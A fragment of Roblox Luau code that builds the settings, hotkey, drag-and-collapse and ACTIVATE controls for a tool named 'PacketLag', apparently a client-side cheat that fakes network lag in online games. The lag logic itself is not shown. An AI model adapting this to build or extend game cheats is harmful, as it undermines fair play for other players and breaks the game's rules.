    PLUI.hotkeyRow = hotkeyRow

    local hotkeyLbl = Instance.new("TextLabel", hotkeyRow)
    hotkeyLbl.Size = UDim2.new(0, 50, 1, 0)
    hotkeyLbl.Position = UDim2.new(0, 8, 0, 0)
    hotkeyLbl.BackgroundTransparency = 1
    hotkeyLbl.Text = "HOTKEY"
    hotkeyLbl.TextColor3 = C.text
    hotkeyLbl.Font = Enum.Font.GothamBold
    hotkeyLbl.TextSize = 8
    hotkeyLbl.TextXAlignment = Enum.TextXAlignment.Left
    hotkeyLbl.ZIndex = 4

    local hotkeyBtn = Instance.new("TextButton", hotkeyRow)
    hotkeyBtn.Size = UDim2.fromOffset(50, 16)
    hotkeyBtn.Position = UDim2.new(1, -58, 0.5, -8)
    hotkeyBtn.BackgroundColor3 = C.chip
    hotkeyBtn.BorderSizePixel = 0
    hotkeyBtn.Text = prettyKeyName(Enum.KeyCode[PacketLagSettings.keybind] or Enum.KeyCode.F)
    hotkeyBtn.TextColor3 = C.text
    hotkeyBtn.Font = Enum.Font.GothamBold
    hotkeyBtn.TextSize = 8
    hotkeyBtn.AutoButtonColor = false
    hotkeyBtn.ZIndex = 4
    guiCorner(hotkeyBtn, 5)
    guiStroke(hotkeyBtn, C.divider, 1, 0.4)
    PLUI.hotkeyBtn = hotkeyBtn

    hotkeyBtn.MouseButton1Click:Connect(function()
        startKeyListen(hotkeyBtn, function(nk)
            PacketLagSettings.keybind = nk.Name
            hotkeyBtn.Text = prettyKeyName(nk)
        end)
    end)

    -- Mobile hint row (replaces hotkey row on mobile)
    local mobileHintRow = Instance.new("Frame", settingsTab)
    mobileHintRow.Size = UDim2.new(1, 0, 0, 22)
    mobileHintRow.Position = UDim2.new(0, 0, 0, 90)
    mobileHintRow.BackgroundColor3 = C.card
    mobileHintRow.BackgroundTransparency = 0.25
    mobileHintRow.BorderSizePixel = 0
    mobileHintRow.ZIndex = 3
    mobileHintRow.Visible = false
    guiCorner(mobileHintRow, 6)
    guiStroke(mobileHintRow, C.divider, 1, 0.45)
    PLUI.mobileHintRow = mobileHintRow

    local hintLbl = Instance.new("TextLabel", mobileHintRow)
    hintLbl.Size = UDim2.new(1, -16, 1, 0)
    hintLbl.Position = UDim2.new(0, 8, 0, 0)
    hintLbl.BackgroundTransparency = 1
    hintLbl.Text = "Tap ACTIVATE to start"
    hintLbl.TextColor3 = C.textDim
    hintLbl.Font = Enum.Font.GothamMedium
    hintLbl.TextSize = 8
    hintLbl.TextXAlignment = Enum.TextXAlignment.Left
    hintLbl.ZIndex = 4

    -- ====================================================================
    -- TAB SWITCHING
    -- ====================================================================
    local function setTab(tabName)
        PLState.activeTab = tabName
        local isMain = (tabName == "MAIN")
        mainTab.Visible = isMain
        settingsTab.Visible = not isMain
        tween(mainTabBtn, {
            BackgroundColor3 = isMain and C.tabActive or C.tabIdle,
            TextColor3 = isMain and Color3.fromRGB(10, 10, 12) or C.textDim,
        }, 0.14)
        tween(settingsTabBtn, {
            BackgroundColor3 = (not isMain) and C.tabActive or C.tabIdle,
            TextColor3 = (not isMain) and Color3.fromRGB(10, 10, 12) or C.textDim,
        }, 0.14)
    end

    mainTabBtn.MouseButton1Click:Connect(function() setTab("MAIN") end)
    settingsTabBtn.MouseButton1Click:Connect(function() setTab("SETTINGS") end)

    -- ====================================================================
    -- DRAG + COLLAPSE
    -- ====================================================================
    do
        local dragging = false
        local dragStartPos, startGuiPos, dragInput
        local moved = false

        header.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
                or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                moved = false
                dragStartPos = input.Position
                startGuiPos = main.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)
        header.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement
                or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                local delta = input.Position - dragStartPos
                if delta.Magnitude > 4 then moved = true end
                main.Position = UDim2.new(
                    startGuiPos.X.Scale, startGuiPos.X.Offset + delta.X,
                    startGuiPos.Y.Scale, startGuiPos.Y.Offset + delta.Y
                )
            end
        end)

        local function toggleCollapse()
            PLState.collapsed = not PLState.collapsed
            local targetSize = PLState.collapsed
                and UDim2.fromOffset(MINI_W, MINI_H)
                or UDim2.fromOffset(FULL_W, FULL_H)
            tween(main, { Size = targetSize }, 0.22)
            tabsRow.Visible = not PLState.collapsed
            tabContainer.Visible = not PLState.collapsed
            if minBtn then
                minBtn.Text = PLState.collapsed and "+" or "−"
            end
        end

        header.MouseButton1Click:Connect(function()
            if moved then return end
            toggleCollapse()
        end)

        minBtn.MouseButton1Click:Connect(toggleCollapse)
    end

    -- ====================================================================
    -- ACTIVATE BUTTON
    -- ====================================================================
    local activateBtn = Instance.new("TextButton", main)
    activateBtn.Size = UDim2.new(1, -16, 0, 26)
    activateBtn.Position = UDim2.new(0, 8, 1, -32)
    activateBtn.BackgroundColor3 = C.white
    activateBtn.BorderSizePixel = 0
    activateBtn.Text = "ACTIVATE"
    activateBtn.TextColor3 = Color3.fromRGB(10, 10, 12)
    activateBtn.Font = Enum.Font.GothamBlack
    activateBtn.TextSize = 10
    activateBtn.AutoButtonColor = false
    activateBtn.ZIndex = 6
    guiCorner(activateBtn, 7)
    PLUI.activateBtn = activateBtn

    activateBtn.MouseEnter:Connect(function()
        if not PLState.running then
            tween(activateBtn, { BackgroundColor3 = Color3.fromRGB(225, 225, 230) }, 0.1)
        else
            tween(activateBtn, { BackgroundColor3 = Color3.fromRGB(255, 100, 110) }, 0.1)
        end
    end)
    activateBtn.MouseLeave:Connect(function()
        tween(activateBtn, { BackgroundColor3 = PLState.running and C.red or C.white }, 0.1)
    end)

    activateBtn.MouseButton1Click:Connect(function()
        if PLState.running then
            stopPacketLag()
        else
            activatePacketLag()
        end
    end)

    setTab("MAIN")
    updateUI()

    -- ====================================================================
    -- HOTKEY
    -- ====================================================================
    local packetLagKeyConn = UIS.InputBegan:Connect(function(input, gp)
        if gp or KeyListen.active then return end
        if PLState.activeMode == "PC" and input.KeyCode.Name == PacketLagSettings.keybind then
            togglePacketLag()
        end
    end)

    bg.AncestryChanged:Connect(function()
        if not bg.Parent then
            stopPacketLag()
            packetLagKeyConn:Disconnect()
        end
    end)
end

-- ========================================================================
-- START
-- ========================================================================
createPacketLagGUI()